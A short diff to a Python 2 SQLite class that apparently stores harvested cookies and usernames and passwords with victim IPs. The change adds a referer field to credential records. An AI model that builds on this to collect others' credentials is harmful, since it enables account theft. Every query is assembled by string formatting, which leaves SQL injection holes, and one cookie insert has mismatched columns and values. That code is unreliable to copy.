@@ -13,7 +13,7 @@ class DB():
         cur=connection.cursor()
         try:
             cur.execute('CREATE TABLE cookie (Id INTEGER PRIMARY KEY, Date TEXT, Clientip TEXT, Data TEXT, Referer TEXT)')
-            cur.execute('CREATE TABLE cred (Id INTEGER PRIMARY KEY, Date TEXT, Clientip TEXT, Username TEXT, Password TEXT)')
+            cur.execute('CREATE TABLE cred (Id INTEGER PRIMARY KEY, Date TEXT, Clientip TEXT, Username TEXT, Password TEXT, Referer TEXT)')
             connection.commit()
         except sqlite3.OperationalError:
             print "Tables seems to be already created."
@@ -29,12 +29,12 @@ class DB():
         date = self.now()
         query = 'INSERT INTO cookie(Date, Clientip, Data) VALUES("%s", "%s", "%s", "%s")' % (date, client_ip, data, referer)
         self.execute_query(query)
-    def insert_cred(self, client_ip, username, password):
+    def insert_cred(self, client_ip, username, password, referer):
         date = self.now()
         if self.select_cred(username, password):
             "already exists, skipping"
         else:
-            query = 'INSERT INTO cred(Date, Clientip, Username, Password) VALUES("%s", "%s", "%s", "%s")' % (date, client_ip, username, password)
+            query = 'INSERT INTO cred(Date, Clientip, Username, Password, Referer) VALUES("%s", "%s", "%s", "%s", "%s")' % (date, client_ip, username, password, referer)
             self.execute_query(query)
     def select_cred(self, username, password):
         query = 'SELECT username, password FROM cred WHERE username = "%s" AND password = "%s"' % (username, password)
